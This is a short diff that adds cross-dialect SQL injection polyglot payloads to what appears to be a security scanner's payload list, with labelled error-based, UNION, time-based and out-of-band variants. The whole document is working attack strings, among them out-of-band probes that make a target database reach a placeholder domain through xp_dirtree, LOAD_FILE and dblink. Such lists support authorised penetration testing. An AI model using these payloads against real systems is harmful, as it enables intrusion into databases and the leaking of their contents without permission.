@@ -1,0 +1,8 @@
+##POLYGLOT - SQLi Cross-Dialect (Error)##
+'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
+##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
+'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
+##POLYGLOT - SQLi Cross-Dialect (Timing)##
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
